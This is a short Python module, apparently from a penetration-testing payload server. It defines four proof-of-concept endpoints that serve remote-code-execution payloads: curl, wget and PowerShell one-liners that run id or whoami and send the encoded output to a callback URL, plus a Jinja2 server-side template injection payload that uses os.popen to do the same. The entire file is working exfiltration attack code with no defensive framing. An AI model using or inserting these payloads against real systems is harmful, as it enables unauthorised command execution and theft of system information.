"""RCE PoC"""
from ..base import poc, PocRequest, PocResponse


@poc(
    name="rce-curl",
    description="RCE curl exfil",
    category="rce",
    content_type="text/plain",
    response_body="curl '{{callback_url}}?_exfil=1&_type=cmd&_data='$(id | base64 -w0)",
    enable_variables=True,
)
async def rce_curl(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = "curl " + chr(39) + cb + "?_exfil=1&_type=cmd&_data=" + chr(39) + "$(id | base64 -w0)"
    return PocResponse(body=body, content_type="text/plain")


@poc(
    name="rce-wget",
    description="RCE wget exfil",
    category="rce",
    content_type="text/plain",
    response_body="wget -q -O- '{{callback_url}}?_exfil=1&_type=cmd&_data='$(whoami)",
    enable_variables=True,
)
async def rce_wget(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = "wget -q -O- " + chr(39) + cb + "?_exfil=1&_type=cmd&_data=" + chr(39) + "$(whoami)"
    return PocResponse(body=body, content_type="text/plain")


@poc(
    name="rce-ps",
    description="RCE PowerShell exfil",
    category="rce",
    content_type="text/plain",
    response_body='powershell -c "IWR \'{{callback_url}}?_exfil=1&_type=cmd&_data=\'+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami)))"',
    enable_variables=True,
)
async def rce_ps(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = "powershell -c " + chr(34) + "IWR " + chr(39) + cb + "?_exfil=1&_type=cmd&_data=" + chr(39) + "+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami)))" + chr(34)
    return PocResponse(body=body, content_type="text/plain")


@poc(
    name="ssti-jinja",
    description="SSTI Jinja2 RCE",
    category="rce",
    content_type="text/plain",
    response_body="{{config.__class__.__init__.__globals__['os'].popen('curl \"{{callback_url}}?_exfil=1&_type=ssti&_data=\"$(id)').read()}}",
    enable_variables=True,
)
async def ssti_jinja(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = "{{config.__class__.__init__.__globals__['os'].popen('curl " + chr(34) + cb + "?_exfil=1&_type=ssti&_data=" + chr(34) + "$(id)').read()}}"
    return PocResponse(body=body, content_type="text/plain")
